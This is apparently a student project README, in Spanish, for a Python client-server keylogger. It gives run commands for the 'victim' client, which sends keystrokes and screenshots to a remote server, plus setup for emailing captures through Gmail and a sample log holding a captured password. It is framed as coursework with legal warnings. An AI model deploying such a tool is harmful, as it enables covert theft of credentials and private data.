# 🔐 Proyecto Keylogger - Ciberseguridad

> **⚠️ AVISO:** Este proyecto es exclusivamente para fines **educativos** dentro de la materia de Ciberseguridad. El uso indebido de herramientas de keylogging sin consentimiento es **ilegal**.

## 📋 Descripción

Aplicación de keylogger con arquitectura **cliente-servidor** desarrollada en Python. El cliente (máquina "víctima") captura teclas y screenshots, enviándolos al servidor para su almacenamiento y análisis.

## 🏗️ Arquitectura

```
┌─────────────────────┐         TCP/IP          ┌─────────────────────┐
│   CLIENTE (Víctima)  │ ─────────────────────▶ │    SERVIDOR          │
│                     │                         │                     │
│  • Captura teclas   │   Protocolo JSON+Payload│  • Recibe datos     │
│  • Toma screenshots │ ──────────────────────▶ │  • Guarda logs .txt │
│  • Log local backup │                         │  • Guarda screenshots│
│                     │                         │  • Envía emails 📧  │
└─────────────────────┘                         └─────────────────────┘
```

### Protocolo de Comunicación

El cliente envía mensajes con un **header JSON** seguido del **payload**:

```json
{"type": "keys", "size": 45}
<45 bytes de texto de teclas>

{"type": "screenshot", "size": 184320, "filename": "screenshot_20260304_200000.png"}
<184320 bytes de imagen PNG>
```

## 📦 Requisitos

- Python 3.8+
- Linux (ambas máquinas)
- Conexión de red entre servidor y cliente

### Dependencias de Python

| Paquete   | Uso                      | Instalación         |
|-----------|--------------------------|---------------------|
| `pynput`  | Captura de teclas        | Solo en el cliente  |
| `Pillow`  | Capturas de pantalla     | Solo en el cliente  |

## 🚀 Instalación

### 1. Clonar/Copiar el proyecto en ambas máquinas

```bash
# En ambas máquinas
cd ~/Workspace/Keylog
```

### 2. Instalar dependencias (solo en el CLIENTE)

```bash
pip install -r requirements.txt
```

> **Nota:** El servidor solo usa la librería estándar de Python, no necesita instalar dependencias adicionales.

## ⚙️ Uso

### Paso 1: Iniciar el Servidor

En la máquina **servidor**, ejecutar:

```bash
# Uso básico (escucha en 0.0.0.0:9999)
python3 server.py

# Especificar puerto
python3 server.py --port 8888

# Con envío de emails activado
python3 server.py --email --smtp-user micorreo@gmail.com --smtp-pass "mi_app_password" --email-to destino@gmail.com
```

**Opciones del servidor:**

| Argumento      | Descripción                              | Default     |
|----------------|------------------------------------------|-------------|
| `--host`       | IP para escuchar                         | `0.0.0.0`   |
| `--port`, `-p` | Puerto TCP                               | `9999`      |
| `--email`      | Activar envío de screenshots por email   | Desactivado |
| `--smtp-user`  | Correo para envío SMTP                   | —           |
| `--smtp-pass`  | App Password de Gmail                    | —           |
| `--email-to`   | Correo destino                           | —           |

### Paso 2: Iniciar el Cliente

En la máquina **cliente** (víctima), ejecutar:

```bash
# Uso básico (conecta a 127.0.0.1:9999)
python3 client.py --host <IP_DEL_SERVIDOR>

# Con intervalo de screenshots personalizado (cada 30 segundos)
python3 client.py --host 192.168.1.100 --interval 30

# Especificar archivo de log local
python3 client.py --host 192.168.1.100 --log mi_log.txt
```

**Opciones del cliente:**

| Argumento         | Descripción                              | Default        |
|-------------------|------------------------------------------|----------------|
| `--host`          | IP del servidor                          | `127.0.0.1`    |
| `--port`, `-p`    | Puerto del servidor                      | `9999`         |
| `--interval`, `-i`| Segundos entre screenshots               | `60`           |
| `--log`           | Archivo de log local                     | `local_log.txt`|

### Paso 3: Detener

Presionar `Ctrl+C` en cualquiera de los dos programas para detenerlos.

## 📧 Configuración de Email (Gmail)

Para enviar capturas por correo usando Gmail:

1. **Activar verificación en 2 pasos** en tu cuenta de Google
2. Ir a [Contraseñas de aplicación](https://myaccount.google.com/apppasswords)
3. Generar una **App Password** para "Correo"
4. Usar esa contraseña con el flag `--smtp-pass`

```bash
python3 server.py --email \
  --smtp-user tucorreo@gmail.com \
  --smtp-pass "abcd efgh ijkl mnop" \
  --email-to destino@gmail.com
```

## 📁 Estructura de Archivos Generados

```
Keylog/
├── server.py              # Código del servidor
├── client.py              # Código del cliente
├── requirements.txt       # Dependencias pip
├── README.md              # Esta documentación
│
├── logs/                  # (Servidor) Logs de teclas capturadas
│   └── keylog_192.168.1.50_2026-03-04_20-00-00.txt
│
├── screenshots/           # (Servidor) Screenshots recibidos
│   └── screenshot_20260304_200100.png
│
├── local_log.txt          # (Cliente) Log local de respaldo
│
└── local_screenshots/     # (Cliente) Screenshots si no hay conexión
    └── screenshot_20260304_200100.png
```

### Formato del Archivo de Log (.txt)

```
=== Sesión iniciada: 2026-03-04_20-00-00 ===
=== Cliente: 192.168.1.50 ===

[20:00:05] Hola[SPACE]mundo[ENTER]
[20:00:12] [CTRL]c
[20:01:30] usuario[TAB]contraseña[ENTER]

=== Sesión finalizada: 2026-03-04 20:30:00 ===
```

## 🔧 Características Técnicas

- **Multihilo:** El servidor acepta múltiples clientes simultáneamente
- **Reconexión automática:** El cliente reintenta la conexión con backoff exponencial
- **Modo offline:** El cliente guarda datos localmente si pierde conexión
- **Thread-safe:** Buffer de teclas protegido con locks
- **Log local:** Respaldo en el cliente por si se pierde la conexión

## ⚠️ Consideraciones Éticas y Legales

1. **Solo para fines educativos** en ambientes controlados
2. **Nunca instalar** en equipos sin el consentimiento explícito del propietario
3. El uso no autorizado de keyloggers es un **delito** penado por la ley
4. Este proyecto demuestra conceptos de ciberseguridad para aprender a **defender** sistemas, no para atacarlos

## 👥 Integrantes

| Nombre | Rol |
|--------|-----|
| —      | Servidor |
| —      | Cliente  |

## 🎓 Materia

**Ciberseguridad** — Proyecto de keylogger cliente-servidor
